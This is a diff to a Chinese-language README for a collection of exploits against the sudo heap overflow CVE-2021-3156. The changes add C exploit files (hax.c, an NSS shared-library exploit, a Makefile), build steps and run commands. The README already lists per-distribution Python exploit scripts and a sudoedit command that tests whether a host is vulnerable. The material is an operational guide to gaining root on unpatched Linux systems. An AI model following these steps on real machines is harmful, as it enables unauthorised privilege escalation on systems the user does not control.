@@ -9,7 +9,7 @@
 | 影响版本 | sudo 1.8.2 ~ 1.8.31p2、1.9.0 ~ 1.9.5p1 |
 | 公开时间 | 2021-01 |
 | 官方上游 | [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) |
-| 源码类型 | Python（多发行版变体） |
+| 源码类型 | Python + C 混合 |
 
 ## 目录结构
 | 文件 | 说明 |
@@ -22,11 +22,19 @@
 | `CVE-2021-3156/exploit_cent7_userspec.py` | CentOS 7 userspec 方案 |
 | `CVE-2021-3156/exploit_userspec.py` | 通用 userspec 方案 |
 | `CVE-2021-3156/exploit_timestamp_race.c` | timestamp 竞态方案（C） |
+| `CVE-2021-3156/hax.c` | 主要 C 利用代码（blasty 上游） |
+| `CVE-2021-3156/lib.c` | NSS 共享库利用 |
+| `CVE-2021-3156/Makefile` | C 代码编译脚本 |
 
 ## 编译
-Python 方案无需编译，`build.sh` 直接拷贝脚本：
 ```bash
+# Python 方案无需编译
+# C 方案需要编译（build.sh 会自动处理）
 ./build.sh <outdir> [gnu|musl]
+
+# 或手动编译 C 代码
+cd CVE-2021-3156
+make
 ```
 
 ## 用法
@@ -34,9 +42,12 @@ Python 方案无需编译，`build.sh` 直接拷贝脚本：
 # 先用 sudo 自身验证漏洞存在（应报错 "malloc(): uninitialized bytes"）
 sudoedit -s '\' $(python3 -c "print('A'*1000)")
 
-# 各发行版选对应脚本
+# Python 方案
 python3 exploit_nss.py          # Ubuntu/Debian 通用
 python3 exploit_cent7_userspec.py   # CentOS 7
+
+# C 方案（需要先编译）
+./sudo-hax-me-a-sandwich <target_number>
 ```
 
 ## 恢复/清理
